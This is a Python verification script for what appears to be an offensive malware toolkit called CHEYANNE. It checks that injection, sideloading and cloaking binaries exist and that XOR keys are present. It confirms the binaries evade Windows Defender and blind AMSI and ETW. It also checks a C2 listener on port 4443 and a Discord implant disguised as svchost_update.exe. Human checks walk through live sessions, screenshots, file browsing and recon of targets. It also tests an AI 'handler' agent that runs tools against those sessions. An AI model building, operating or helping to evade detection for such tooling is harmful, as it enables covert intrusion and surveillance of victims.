"""
test_verify.py — Automated + Human Verification Test Suite
22DIV / george wu

Runs every testable check automatically, pauses for human eyes where needed.
Logs results to TEST_RESULTS_<timestamp>.txt
"""
import os
import sys
import time
import glob
import json
import subprocess
import socket
import re
from datetime import datetime

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT = os.path.dirname(os.path.abspath(__file__))
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_FILE = os.path.join(ROOT, f"TEST_RESULTS_{TIMESTAMP}.txt")

GRN = "\033[92m"
RED = "\033[91m"
YLW = "\033[93m"
CYN = "\033[96m"
DIM = "\033[90m"
WHT = "\033[97m"
BLD = "\033[1m"
RST = "\033[0m"

results = []


def log(msg):
    clean = re.sub(r'\033\[[0-9;]*m', '', msg)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(clean + "\n")
    print(msg)


def test_header(num, name):
    log(f"\n  {CYN}{BLD}═══ TEST {num}: {name} ═══{RST}")


def auto_pass(num, name, condition, detail=""):
    status = "PASS" if condition else "FAIL"
    color = GRN if condition else RED
    tag = f"[{status}]"
    msg = f"  {color}{tag}{RST} #{num} {name}"
    if detail:
        msg += f" {DIM}— {detail}{RST}"
    log(msg)
    results.append((num, name, status, detail))
    return condition


def human_verify(num, name, prompt_text):
    log(f"\n  {YLW}  ▶ HUMAN CHECK #{num}: {name}{RST}")
    log(f"  {DIM}  {prompt_text}{RST}")
    answer = input(f"  {CYN}  Pass? [Y/n/s(kip)]: {RST}").strip().lower()
    if answer == "s":
        status = "SKIP"
        color = YLW
    elif answer == "n":
        status = "FAIL"
        color = RED
        note = input(f"  {RED}  What failed? {RST}").strip()
        results.append((num, name, status, note))
        log(f"  {color}[{status}]{RST} #{num} {name} — {note}")
        return False
    else:
        status = "PASS"
        color = GRN
    results.append((num, name, status, ""))
    log(f"  {color}[{status}]{RST} #{num} {name}")
    return status != "FAIL"


def find_mpcmdrun():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"), reverse=True):
        return p
    return None


def scan_file(path):
    mp = find_mpcmdrun()
    if not mp:
        return None
    try:
        r = subprocess.run([mp, "-Scan", "-ScanType", "3", "-File", path, "-DisableRemediation"],
                           capture_output=True, text=True, timeout=30)
        return r.returncode == 0
    except Exception:
        return None


def port_free(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.bind(("0.0.0.0", port))
        s.close()
        return True
    except OSError:
        return False


def count_binaries():
    exts = (".exe", ".dll", ".obj")
    skip = (".git", "__pycache__", "build", "dist", "node_modules")
    count = 0
    for dirpath, dirnames, filenames in os.walk(ROOT):
        dirnames[:] = [d for d in dirnames if d not in skip]
        for f in filenames:
            if any(f.lower().endswith(e) for e in exts):
                count += 1
    return count


# ──────────────────────────────────────────────
# TESTS
# ──────────────────────────────────────────────

def run_tests():
    log(f"  {GRN}{BLD}╔══════════════════════════════════════════════════╗{RST}")
    log(f"  {GRN}{BLD}║  CHEYANNE — Full Verification Suite              ║{RST}")
    log(f"  {GRN}{BLD}║  {TIMESTAMP}                                ║{RST}")
    log(f"  {GRN}{BLD}╚══════════════════════════════════════════════════╝{RST}")
    log(f"  {DIM}Log: {LOG_FILE}{RST}")

    # ── PHASE 1: BUILD CHECKS (automated) ──
    test_header("1-5", "PHASE 1 — BUILD")

    binaries = {
        "dark_room": "dark_room/dark_room.exe",
        "shell": "shell/vader_shell.exe",
        "inject_exe": "injection/vader_inject.exe",
        "inject_dll": "injection/vader_inject.dll",
        "svc_replace": "sideload/svc_replace.exe",
        "dll_proxy": "sideload/version_v6_stealth.c",
        "cloak_dll": "cloak/bin/cloak.dll",
        "cloak_loader": "cloak/bin/cloak_loader.exe",
    }

    built_count = 0
    for name, path in binaries.items():
        exists = os.path.exists(os.path.join(ROOT, path))
        if exists:
            built_count += 1
        auto_pass(1, f"Binary exists: {name}", exists, path)

    auto_pass(2, "Build count", built_count >= 6, f"{built_count}/{len(binaries)} core binaries")

    key_sources = {
        "dark_room": "dark_room/dark_room_annotated.c",
        "shell": "shell/vader_shell_annotated.c",
        "inject": "injection/vader_inject_annotated.c",
    }
    keys_found = 0
    for comp, src in key_sources.items():
        src_path = os.path.join(ROOT, src)
        if os.path.exists(src_path):
            with open(src_path, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if "#define XOR_KEY" in line and "0x" in line:
                        key_val = line.strip().split()[-1]
                        log(f"  {DIM}    {comp}: {key_val}{RST}")
                        keys_found += 1
                        break
    auto_pass(3, "XOR keys present", keys_found >= 2, f"{keys_found} keys found")

    mp = find_mpcmdrun()
    auto_pass(4, "Defender available", mp is not None, str(mp)[:60] if mp else "NOT FOUND")

    # scan a few key binaries
    scan_targets = ["dark_room/dark_room.exe", "shell/vader_shell.exe", "cloak/bin/cloak.dll"]
    scan_pass = 0
    scan_total = 0
    for t in scan_targets:
        full = os.path.join(ROOT, t)
        if os.path.exists(full):
            scan_total += 1
            result = scan_file(full)
            if result:
                scan_pass += 1
                log(f"  {DIM}    {t}: {GRN}CLEAN{RST}")
            elif result is False:
                log(f"  {DIM}    {t}: {RED}DETECTED{RST}")
            else:
                log(f"  {DIM}    {t}: {YLW}SCAN ERROR{RST}")
    auto_pass(5, "Quick scan", scan_pass == scan_total and scan_total > 0,
              f"{scan_pass}/{scan_total} clean")

    # ── PHASE 2: STEALTH (human + auto) ──
    test_header("6-9", "PHASE 2 — STEALTH")

    dr_exe = os.path.join(ROOT, "dark_room", "dark_room.exe")
    auto_pass(6, "Dark Room binary exists", os.path.exists(dr_exe))

    input(f"\n  {YLW}  ▶ Run Dark Room now? Press Enter to launch (or 's' to skip): {RST}")
    choice = "y"
    if choice != "s":
        if os.path.exists(dr_exe):
            log(f"  {YLW}  [*] Launching dark_room.exe --test ...{RST}")
            try:
                r = subprocess.run([dr_exe, "--test"], capture_output=True, text=True, timeout=15, cwd=ROOT)
                output = r.stdout + r.stderr
                log(f"  {DIM}{output[:500]}{RST}")
                amsi_blind = "BLIND" in output.upper() and "AMSI" in output.upper()
                etw_blind = "BLIND" in output.upper() and "ETW" in output.upper()
                auto_pass(7, "AMSI BLIND", amsi_blind, "AMSI bypass via HWBP DR0")
                auto_pass(8, "ETW BLIND", etw_blind, "ETW bypass via HWBP DR1")
            except subprocess.TimeoutExpired:
                log(f"  {RED}  [!] Dark Room timed out (may need interactive run){RST}")
                human_verify(7, "AMSI bypass", "Run dark_room.exe --test manually. Does it say AMSI: BLIND?")
                human_verify(8, "ETW bypass", "Does it say ETW: BLIND?")
        else:
            auto_pass(7, "AMSI BLIND", False, "dark_room.exe not found")
            auto_pass(8, "ETW BLIND", False, "dark_room.exe not found")

    cloak_dll = os.path.join(ROOT, "cloak", "bin", "cloak.dll")
    cloak_loader = os.path.join(ROOT, "cloak", "bin", "cloak_loader.exe")
    auto_pass(9, "Cloak binaries", os.path.exists(cloak_dll) and os.path.exists(cloak_loader),
              f"dll={'YES' if os.path.exists(cloak_dll) else 'NO'} loader={'YES' if os.path.exists(cloak_loader) else 'NO'}")

    human_verify(10, "Cloak test",
                 "Menu [8] Test Cloak — process count drops? port 4443 hidden? Unhook restores?")

    # ── PHASE 3: DEPLOY (human-heavy) ──
    test_header("11-14", "PHASE 3 — DEPLOY")

    auto_pass(11, "Port 4443 free", port_free(4443),
              "ready for C2" if port_free(4443) else "BLOCKED — use menu [D], it will offer to kill")

    implant_exe = os.path.join(ROOT, "agent", "dist_py", "svchost_update.exe")
    auto_pass(12, "Discord implant built", os.path.exists(implant_exe),
              f"{os.path.getsize(implant_exe):,} bytes" if os.path.exists(implant_exe) else "run menu [B]")

    human_verify(13, "C2 Shell launch",
                 "Menu [D] → TCP :4443 + Discord poller starts? No port conflict error?")
    human_verify(14, "Radon connects",
                 "Radon shell appears? Type 'sessions' in chey> — see TCP + Discord sessions?")

    # ── PHASE 4: OPERATE (human-heavy, needs live session) ──
    test_header("15-20", "PHASE 4 — OPERATE")

    try:
        sys.path.insert(0, ROOT)
        from cheyanne_ops import get_sessions, CFG
        auto_pass(15, "cheyanne_ops loads", True)
        auto_pass(16, "Discord config", bool(CFG.get("webhook_url")) and bool(CFG.get("bot_token")),
                  f"webhook={'YES' if CFG.get('webhook_url') else 'NO'} token={'YES' if CFG.get('bot_token') else 'NO'} channel={CFG.get('channel_id', 'MISSING')}")

        sessions = get_sessions()
        session_count = len(sessions)
        auto_pass(17, "Live sessions", session_count > 0,
                  f"{session_count} session(s)" if session_count else "0 — deploy implant first")
        if sessions:
            for sid, info in sessions.items():
                log(f"  {DIM}    {sid}: {info.get('hostname','?')} / {info.get('user','?')}{RST}")
    except Exception as e:
        auto_pass(15, "cheyanne_ops loads", False, str(e))

    human_verify(18, "Screenshot [T]",
                 "Menu [T] → BMP downloads? Converts to PNG? Opens in explorer? Shows Radon desktop?")
    human_verify(19, "Browse [L]",
                 "Menu [L] → type C:\\Users → listing appears from target?")
    human_verify(20, "Recon [N]",
                 "Menu [N] → full system info from target? hostname, user, IP, processes?")

    # ── HANDLER AI TEST (automated + human) ──
    test_header("21-22", "HANDLER AI AGENT")

    agent_script = os.path.join(ROOT, "cheyanne_agent.py")
    auto_pass(21, "Agent script exists", os.path.exists(agent_script))

    log(f"\n  {YLW}  ▶ Testing HANDLER with automated query...{RST}")
    try:
        proc = subprocess.run(
            [sys.executable, "-c", f"""
import sys
sys.path.insert(0, r'{ROOT}')
from cheyanne_agent import OllamaBackend, exec_tool

# Test 1: direct tool execution
r1 = exec_tool("list_sessions", {{}})
print(f"TOOL_TEST: {{r1}}")

# Test 2: local_command
r2 = exec_tool("local_command", {{"command": "whoami"}})
print(f"LOCAL_CMD: {{r2.strip()}}")

# Test 3: Ollama connectivity
try:
    backend = OllamaBackend()
    print(f"OLLAMA: connected to {{backend.base}}")
except Exception as e:
    print(f"OLLAMA: FAILED — {{e}}")
"""],
            capture_output=True, text=True, timeout=30
        )
        output = proc.stdout.strip()
        log(f"  {DIM}{output}{RST}")

        tool_ok = "TOOL_TEST:" in output
        local_ok = "LOCAL_CMD:" in output and "gwu07" in output.lower()
        ollama_ok = "OLLAMA: connected" in output

        auto_pass("22a", "Tool dispatch works", tool_ok)
        auto_pass("22b", "Local command works", local_ok, output.split("LOCAL_CMD:")[1].strip()[:40] if local_ok else "")
        auto_pass("22c", "Ollama connected", ollama_ok)

    except subprocess.TimeoutExpired:
        auto_pass("22a", "HANDLER test", False, "timed out (Ollama down?)")
    except Exception as e:
        auto_pass("22a", "HANDLER test", False, str(e))

    human_verify(23, "HANDLER chat test",
                 "Menu [H] → type 'list sessions' → does it fire tools (⚡ markers)? Type 'exit' to quit.")

    # ── EXTRAS ──
    test_header("24-26", "EXTRAS")

    auto_pass(24, "ROADMAP exists", os.path.exists(os.path.join(ROOT, "ROADMAP.md")))
    auto_pass(25, "Docs complete",
              all(os.path.exists(os.path.join(ROOT, "docs", f)) for f in
                  ["BUILD_FROM_ASHES.md", "CODE_WALKTHROUGH.md", "VADER_MANUAL.md", "evc.html"]),
              "BUILD_FROM_ASHES + CODE_WALKTHROUGH + VADER_MANUAL + evc.html")

    backup_pattern = os.path.join(os.path.expanduser("~"), "Desktop", "cheyanne-FULL-*.7z")
    backups = glob.glob(backup_pattern)
    auto_pass(26, "Encrypted backup exists", len(backups) > 0,
              f"{len(backups)} backup(s), latest: {os.path.basename(backups[-1]) if backups else 'NONE'}")

    # ── SUMMARY ──
    log(f"\n  {GRN}{BLD}{'═' * 54}{RST}")
    log(f"  {GRN}{BLD}  RESULTS SUMMARY{RST}")
    log(f"  {GRN}{BLD}{'═' * 54}{RST}")

    passed = sum(1 for _, _, s, _ in results if s == "PASS")
    failed = sum(1 for _, _, s, _ in results if s == "FAIL")
    skipped = sum(1 for _, _, s, _ in results if s == "SKIP")
    total = len(results)

    log(f"\n  {GRN}  PASS: {passed}{RST}  {RED}  FAIL: {failed}{RST}  {YLW}  SKIP: {skipped}{RST}  {DIM}  TOTAL: {total}{RST}")

    if failed:
        log(f"\n  {RED}{BLD}  FAILURES:{RST}")
        for num, name, status, detail in results:
            if status == "FAIL":
                log(f"  {RED}  #{num} {name}: {detail}{RST}")

    log(f"\n  {DIM}  Full log: {LOG_FILE}{RST}")
    log(f"  {DIM}  Timestamp: {TIMESTAMP}{RST}")

    return failed == 0


if __name__ == "__main__":
    try:
        success = run_tests()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        log(f"\n  {YLW}  [!] Interrupted by operator{RST}")
        sys.exit(130)
